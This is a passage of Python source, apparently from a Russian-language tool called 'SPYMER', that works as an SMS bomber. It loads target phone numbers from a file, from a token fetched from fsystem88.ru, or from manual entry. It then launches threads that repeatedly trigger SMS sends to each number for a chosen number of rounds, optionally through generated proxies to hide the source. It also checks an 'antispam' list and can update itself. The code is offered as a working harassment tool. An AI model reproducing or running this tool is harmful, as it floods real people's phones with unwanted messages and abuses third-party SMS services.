				clear()
				logo()
				print(info)
				try:
					os.chdir(os.getenv("HOME"))
					file=open("{}".format(f_name))
					array=file.read().splitlines()
					if array[-1] == '':
						array.pop()
					print("Файл найден.\nНомера:\n{}".format(array))
					print('Введите количество кругов ("Enter" - отмена):')
					count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
					try:
						if int(count):
							count=int(count)
							info = '\nФайл: ~/{}\nКол-во кругов: {}'.format(f_name, count)
							clear()
							logo()
							print(info)
							for phone in array:
								make7phone()
								if proxy=="localhost":
									proxies=None
								else:
									proxies={ssl:proxy}
								try:
									if int(phone):
										id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
										if int(id) > 0:
											print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.".format(phone)+Style.RESET_ALL)
											exit()
										elif int(id)==0:
											print('\nЗапущен спам на {}.Если хочешь остановить - нажмите Ctrl+Z.'.format(phone))
											thread_list = []
											t = threading.Thread (target=n_send, args=(phone,count, proxies))
											thread_list.append(t)
											t.start()
								except:
									print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
							for th in threading.enumerate(): 
								if th != threading.currentThread():
									th.join()	
					except:
						info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

					print(Fore.BLUE+"\nГотово.\nФайл: {}\nКол-во кругов: {}".format(f_name, count)+Style.RESET_ALL)
					exit()
				except FileNotFoundError:
					info=Fore.RED+"\nФайл {} не найден".format(f_name)+Style.RESET_ALL

			def tokensend():
				global phone
				global name
				global password
				global email
				global ssl
				global proxy
				global info
				global proxies
				clear()
				logo()
				print(info)
				print("Введите токен: ")
				print("Загрузить файл и получить токен можно по ссылке:")
				print(Fore.GREEN+"https://FSystem88.ru/spymer/\n"+Style.RESET_ALL)
				token=input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
				id=requests.post('https://fsystem88.ru/spymer/spym.php', data={'token': token}).json()["id"]
				if int(id) != 0:
					req=requests.get("https://fsystem88.ru/spymer/token/{}".format(token))
					info=""
					clear()
					logo()
					print(info)
					array=req.text.splitlines()
					if "<h1>Not Found</h1>" in array:
						info=Fore.RED+"Токен не найден на сервере.\n Загрузите файл и получите токен на сайте:\n"+Fore.GREEN+"https://FSystem88.ru/spymer"+Style.RESET_ALL
					else:
						if array[-1] == '':
							array.pop()
						print("Файл загружен успешно.\nТелефоны:\n{}".format(req.text))
						print('Введите количество кругов ("Enter" - отмена):')
						count = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						try:
							if int(count):
								count=int(count)
								info = '\nТокен: {}\nКол-во кругов: {}'.format(token, count)
								clear()
								logo()
								print(info)
								for phone in array:
									make7phone()
									if proxy=="localhost":
										proxies=None
									else:
										proxies={ssl:proxy}
									try:
										if int(phone):
											id=requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()["id"]
											if int(id) > 0:
												print(Fore.RED+"\nНомер телефона {} находится в антиспам листе.".format(phone)+Style.RESET_ALL)
												exit()
											elif int(id)==0:
												print('\nЗапущен спам на {}.Если хочешь остановить - нажмите Ctrl+Z.'.format(phone))
												thread_list = []
												t = threading.Thread (target=n_send, args=(phone,count, proxies))
												thread_list.append(t)
												t.start()
									except:
										print(Fore.RED+'\n"{}" не является номером телефона.'.format(phone)+Style.RESET_ALL)
								for th in threading.enumerate(): 
									if th != threading.currentThread():
										th.join()	
						except:
							info = Fore.RED+"\nНекорректно введено количество кругов!"+Style.RESET_ALL

						print(Fore.BLUE+"\nГотово.\nТокен: {}\nКол-во кругов: {}\n".format(token, count)+Style.RESET_ALL)
						exit()

			def n_send(phone, count, proxies):
				global name
				global password
				global email
				global info
				iteration=0
				while iteration < count:
					addparams()
					sms()
					iteration+=1
					print(Fore.GREEN+"{}".format(phone)+Style.RESET_ALL+": круг №{} пройден.".format(iteration))
				print(Fore.GREEN+"\nСпам на {} закончен. Кол-во кругов {}".format(phone, count)+Style.RESET_ALL)
				exit()
			
			def main():
				global phone
				global info
				global proxy
				global ssl
				global proxies 
				proxy = "localhost"
				info = " "
				while True:
					clear()
					logo()
					print(info)
					checkver()
					print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
					print("1) СМС спамер.")
					print("2) Проверить телефон в антиспам лист.")
					print("3) Добавить телефон в антиспам листе.")
					print("4) Обновить прокси.")
					print("5) Обновить SPYMER.")
					print("6) Выход.")
					input1 = input(Fore.BLUE+"Введите номер пункта: "+Style.RESET_ALL)
					if input1 == "1":
						clear()
						logo()
						print(info)
						print("Выберите один вариант:")
						print("1. Запустить спамер на один номер")
						print("2. Выгрузить номера из TXT файла ")
						print("3. Выгрузить номера по токену")
						input11= input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						if input11 == "1":
							onesend()

						elif input11 == "2":
							filesend()

						elif input11 == "3":
							tokensend()
						else:
							print("Некорректно")
					
					elif input1 == "2":
						checkspamlist()

					elif input1 == "3":
						addantispam()
					
					elif input1 == "4":
						print("1. Удалить прокси")
						print("2. Ввести свой прокси")
						print("3. Сгенерировать прокси")
						input51 = input(Fore.BLUE+"spymer > "+Style.RESET_ALL)
						if input51=="1":
							proxy = "localhost"
						
						elif input51=="2":
							updateproxy()

						elif input51=="3":
							generateproxy()

					elif input1 == "5":
						update()
					
					elif input1 == "6":
						print (Fore.BLUE+"\nДо скорой встречи!)\n"+Style.RESET_ALL)
						exit()

			main()
		Main()
		
	except ModuleNotFoundError:
		os.system('cls' if os.name=='nt' else 'clear')
		print("Нажмите Enter чтобы установить недостающие библиотеки...")
		input()
		os.system("python -m pip install requests colorama proxyscrape")

		MAIN()
MAIN()
